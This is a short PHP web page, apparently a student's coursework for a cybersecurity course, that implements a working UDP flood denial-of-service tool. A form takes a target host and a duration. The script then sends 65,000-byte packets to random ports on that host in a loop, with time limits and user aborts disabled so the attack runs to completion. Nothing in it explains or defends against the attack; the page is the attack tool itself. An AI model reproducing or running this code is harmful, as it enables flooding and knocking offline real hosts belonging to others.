<!DOCTYPE html>
<html>
<title>PHP Ddos - Cybersecurity Essentials - Hong Nguyen Nam - W71039</title>

<head>
	<style>
		input {
			background-color: white;
			font-size: 10pt;
			color: black;
			border: 1 solid #666;
		}
	</style>
</head>

<body>
	<center>
		<?php
		if (isset($_GET['host'], $_GET['time'])) {
			$packets = 0;
			ignore_user_abort(true);
			set_time_limit(0);

			$exec_time = $_GET['time'];
			$max_time = time() + $exec_time;

			$host = $_GET['host'];
			$out = str_repeat('X', 65000);

			while (time() <= $max_time) {
				$packets++;
				$rand = rand(1, 65000);
				$fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);

				if ($fp) {
					fwrite($fp, $out);
					fclose($fp);
				}
			}
			echo "<br><b>UDP Flood - Cybersecurity Essentials - Hong Nguyen Nam - W71039</b><br>Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $exec_time, 2) . " packets per second \n";
			echo '<br><br><form action="' . $surl . '" method="GET">
				<input type="hidden" name="act" value="phptools">
				Host: <br><input type="text" name="host"><br>
				Length (seconds): <br><input type="text" name="time"><br>
				<input type="submit" value="Go">
			</form>';
		} else {
			echo '<br><b>UDP Flood - Cybersecurity Essentials - Hong Nguyen Nam - W71039 </b><br>
				<form action="?" method="GET">
					<input type="hidden" name="act" value="phptools">
					Host: <br><input type="text" name="host" value=""><br>
					Length (seconds): <br><input type="text" name="time" value=""><br><br>
					<input type="submit" value="Go">
				</form>';
		}
		?>
	</center>
</body>

</html>
